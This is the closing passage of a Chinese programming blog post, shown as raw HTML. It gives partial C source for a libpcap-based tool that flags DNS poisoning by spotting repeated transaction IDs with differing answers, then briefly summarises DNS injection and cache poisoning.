		class <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>u_short <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>answer_start <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		resp_size <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>u_short <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>answer_start <span class="token operator">+</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

		id_found <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">htons</span><span class="token punctuation">(</span>type<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> 
		<span class="token punctuation">{<!-- --></span>	<span class="token comment">// Evaluate only if Type A</span>
			ip_index <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>u_int <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>answer_start <span class="token operator">+</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// 获取数据包中IP的索引</span>
			<span class="token function">sprintf</span><span class="token punctuation">(</span>ip_from_pkt<span class="token punctuation">,</span> <span class="token string">"%u.%u.%u.%u"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>u_char <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>ip_index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
			        <span class="token punctuation">(</span><span class="token punctuation">(</span>u_char <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>ip_index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
			        <span class="token punctuation">(</span><span class="token punctuation">(</span>u_char <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>ip_index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
			        <span class="token punctuation">(</span><span class="token punctuation">(</span>u_char <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>ip_index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

			<span class="token comment">/* 检查ID是否已存在于数据库中，从而引发攻击 */</span>
			<span class="token keyword">for</span> <span class="token punctuation">(</span>j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> array_size<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> 
			<span class="token punctuation">{<!-- --></span>
				<span class="token keyword">if</span> <span class="token punctuation">(</span>id <span class="token operator">==</span> database<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>id<span class="token punctuation">)</span> 
				<span class="token punctuation">{<!-- --></span>
					index_in_db <span class="token operator">=</span> j<span class="token punctuation">;</span>
					possible_attack <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
					id_found <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
				<span class="token punctuation">}</span>
			<span class="token punctuation">}</span>

			<span class="token function">strcpy</span><span class="token punctuation">(</span>new_ip_list<span class="token punctuation">[</span>k<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">,</span> ip_from_pkt<span class="token punctuation">)</span><span class="token punctuation">;</span>

			answer_start <span class="token operator">=</span> answer_start <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span> 
		<span class="token keyword">else</span> 
		<span class="token punctuation">{<!-- --></span>
			answer_start <span class="token operator">=</span> answer_start <span class="token operator">+</span> <span class="token number">12</span> <span class="token operator">+</span> <span class="token function">htons</span><span class="token punctuation">(</span>resp_size<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>


	<span class="token punctuation">}</span>

	<span class="token comment">/* 在数据库中找不到条目，请创建新条目 */</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>id_found <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> 
	<span class="token punctuation">{<!-- --></span>
		<span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> k<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> 
		<span class="token punctuation">{<!-- --></span>
			database<span class="token punctuation">[</span>array_size<span class="token punctuation">]</span><span class="token punctuation">.</span>id <span class="token operator">=</span> id<span class="token punctuation">;</span>
			<span class="token function">strcpy</span><span class="token punctuation">(</span>database<span class="token punctuation">[</span>array_size<span class="token punctuation">]</span><span class="token punctuation">.</span>ip<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> new_ip_list<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
		database<span class="token punctuation">[</span>array_size<span class="token punctuation">]</span><span class="token punctuation">.</span>list_size <span class="token operator">=</span> k<span class="token punctuation">;</span>
		array_size <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">/* 如果可能发生攻击，则警告用户 */</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>possible_attack <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> 
	<span class="token punctuation">{<!-- --></span>
		<span class="token comment">/* 从数据包标头获取时间 */</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>

		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nDNS poisoning attempt detected!!!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Timestamp: %s"</span><span class="token punctuation">,</span> <span class="token function">asctime</span><span class="token punctuation">(</span>timeinfo<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"TXID: 0x"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%x"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>u_char <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>hex_id<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%x\t"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>u_char <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>hex_id <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Request: %s\n"</span><span class="token punctuation">,</span> request<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Answer1 ["</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> database<span class="token punctuation">[</span>index_in_db<span class="token punctuation">]</span><span class="token punctuation">.</span>list_size<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> 
		<span class="token punctuation">{<!-- --></span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">==</span> database<span class="token punctuation">[</span>index_in_db<span class="token punctuation">]</span><span class="token punctuation">.</span>list_size<span class="token punctuation">)</span> 
			<span class="token punctuation">{<!-- --></span>
				<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> database<span class="token punctuation">[</span>index_in_db<span class="token punctuation">]</span><span class="token punctuation">.</span>ip<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token punctuation">}</span>
			 <span class="token keyword">else</span> 
			 <span class="token punctuation">{<!-- --></span>
				<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s, "</span><span class="token punctuation">,</span> database<span class="token punctuation">[</span>index_in_db<span class="token punctuation">]</span><span class="token punctuation">.</span>ip<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token punctuation">}</span>
		<span class="token punctuation">}</span>
		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"]\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Answer2 ["</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> k<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> 
		<span class="token punctuation">{<!-- --></span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">==</span> k<span class="token punctuation">)</span> 
			<span class="token punctuation">{<!-- --></span>
				<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> new_ip_list<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token punctuation">}</span> 
			<span class="token keyword">else</span> 
			<span class="token punctuation">{<!-- --></span>
				<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s, "</span><span class="token punctuation">,</span> new_ip_list<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token punctuation">}</span>
		<span class="token punctuation">}</span>
		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"]\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>

	<span class="token comment">/* Parse the command line arguments */</span>
	<span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>option <span class="token operator">=</span> <span class="token function">getopt</span><span class="token punctuation">(</span>argc<span class="token punctuation">,</span> argv<span class="token punctuation">,</span> <span class="token string">"i:r:h"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
		<span class="token keyword">switch</span> <span class="token punctuation">(</span>option<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
		<span class="token keyword">case</span> <span class="token char">'i'</span><span class="token operator">:</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span>interface_provided<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
				<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"You should provide only one device. Multiple devices "</span>
				       <span class="token string">"are not supported.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
				<span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token punctuation">}</span>
			dev <span class="token operator">=</span> optarg<span class="token punctuation">;</span>
			interface_provided <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
			<span class="token keyword">break</span><span class="token punctuation">;</span>
		<span class="token keyword">case</span> <span class="token char">'r'</span><span class="token operator">:</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span>read_file<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
				<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"You should provide only one file. Multiple files "</span>
				       <span class="token string">"are not supported.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
				<span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token punctuation">}</span>
			file_name <span class="token operator">=</span> optarg<span class="token punctuation">;</span>
			read_file <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
			<span class="token keyword">break</span><span class="token punctuation">;</span>
		<span class="token keyword">case</span> <span class="token char">'h'</span><span class="token operator">:</span>
			<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"help: dns_detect [-i interface] [-r tracefile] &lt;expression&gt;\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token function">exit</span><span class="token punctuation">(</span>EXIT_SUCCESS<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">break</span><span class="token punctuation">;</span>
		<span class="token keyword">default</span><span class="token operator">:</span>
			<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"unknown option or missing argument! Exiting.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span>optind <span class="token operator">&lt;</span> argc<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
		bpf_filter_exp <span class="token operator">=</span> argv<span class="token punctuation">[</span>optind<span class="token punctuation">]</span><span class="token punctuation">;</span>
		bpf_filter <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">pcap_lookupnet</span><span class="token punctuation">(</span>dev<span class="token punctuation">,</span> <span class="token operator">&amp;</span>net<span class="token punctuation">,</span> <span class="token operator">&amp;</span>mask<span class="token punctuation">,</span> errbuf<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
		<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Can't get netmask for device %s\n"</span><span class="token punctuation">,</span> dev<span class="token punctuation">)</span><span class="token punctuation">;</span>
		net <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
		mask <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>


	<span class="token keyword">if</span> <span class="token punctuation">(</span>read_file <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
		handle <span class="token operator">=</span> <span class="token function">pcap_open_offline</span><span class="token punctuation">(</span>file_name<span class="token punctuation">,</span> errbuf<span class="token punctuation">)</span><span class="token punctuation">;</span>  
		<span class="token keyword">if</span> <span class="token punctuation">(</span>handle <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> 
		<span class="token punctuation">{<!-- --></span>
			<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Couldn't open pcap file %s: %s\n"</span><span class="token punctuation">,</span> file_name<span class="token punctuation">,</span> errbuf<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span> 
		<span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
			<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Opened file %s\n\n"</span><span class="token punctuation">,</span> file_name<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
	<span class="token punctuation">}</span> 
	<span class="token keyword">else</span> 
	<span class="token punctuation">{<!-- --></span>
		handle <span class="token operator">=</span> <span class="token function">pcap_open_live</span><span class="token punctuation">(</span>dev<span class="token punctuation">,</span> BUFSIZ<span class="token punctuation">,</span> PROMISC<span class="token punctuation">,</span> READ_TIME_OUT<span class="token punctuation">,</span> errbuf<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>handle <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> 
		<span class="token punctuation">{<!-- --></span>
			<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Couldn't open device %s: %s\n"</span><span class="token punctuation">,</span> dev<span class="token punctuation">,</span> errbuf<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span> 
		<span class="token keyword">else</span> 
		<span class="token punctuation">{<!-- --></span>
			<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Listening on device: %s\n\n"</span><span class="token punctuation">,</span> dev<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
	<span class="token punctuation">}</span>



	<span class="token keyword">if</span> <span class="token punctuation">(</span>bpf_filter <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
		filter_exp <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span>dns_filter<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">strlen</span><span class="token punctuation">(</span>bpf_filter_exp<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">strcpy</span><span class="token punctuation">(</span>filter_exp<span class="token punctuation">,</span> dns_filter<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">strcat</span><span class="token punctuation">(</span>filter_exp<span class="token punctuation">,</span> <span class="token string">" and "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">strcat</span><span class="token punctuation">(</span>filter_exp<span class="token punctuation">,</span> bpf_filter_exp<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span> 
	<span class="token keyword">else</span> 
	<span class="token punctuation">{<!-- --></span>
		filter_exp <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span>dns_filter<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">strcpy</span><span class="token punctuation">(</span>filter_exp<span class="token punctuation">,</span> dns_filter<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>


	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">pcap_compile</span><span class="token punctuation">(</span>handle<span class="token punctuation">,</span> <span class="token operator">&amp;</span>fp<span class="token punctuation">,</span> filter_exp<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
		<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Couldn't parse filter %s: %s\n"</span><span class="token punctuation">,</span> filter_exp<span class="token punctuation">,</span>
		        <span class="token function">pcap_geterr</span><span class="token punctuation">(</span>handle<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">goto</span> free_filter<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>


	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">pcap_setfilter</span><span class="token punctuation">(</span>handle<span class="token punctuation">,</span> <span class="token operator">&amp;</span>fp<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
		<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Couldn't install filter %s: %s\n"</span><span class="token punctuation">,</span> filter_exp<span class="token punctuation">,</span>
		        <span class="token function">pcap_geterr</span><span class="token punctuation">(</span>handle<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">goto</span> free_filter<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token punctuation">}</span>

</code></pre> 
<p>If you need the complete source code, please add the WeChat number (<strong>c17865354792</strong>)</p> 
<p><img src="https://images2.imgbox.com/60/97/lHHh8KtX_o.png" alt=""></p> 
<p>为了检测和防范DNS数据包注入和DNS中毒攻击，需要综合使用技术手段和安全策略，确保网络和系统的安全性。同时，及时保持软件和设备的更新，并加强网络安全意识，是减少风险的重要措施。</p> 
<p><strong>总结</strong></p> 
<p>DNS数据包注入与DNS中毒攻击是网络安全领域中两种重要的攻击方式。DNS数据包注入是一种攻击手段，通过向DNS服务器发送恶意数据包，以篡改其正常功能。而DNS中毒攻击则是一种针对DNS缓存的攻击，目的是通过向DNS服务器的缓存中添加恶意记录，从而使用户访问到错误的网站。</p> 
<p>Welcome to follow WeChat official account【<strong>程序猿编码</strong>】</p> 
<p>参考：http://www.microhowto.info/howto<br> http://www.ccs.neu.edu/home/amislove/teaching/cs4700/fall09/handouts/project1-primer.pdf</p>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/a4be0452dd67ab3a644a38758fec6ecc/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">idea报错Java HotSpot(TM) 64-Bit Server VM warning: Options -Xverify:none and -noverify were deprecated</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/b4d76cc7f1dc4909a5ec3c564f1cf9bb/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">吃透modbus协议</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程大白的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>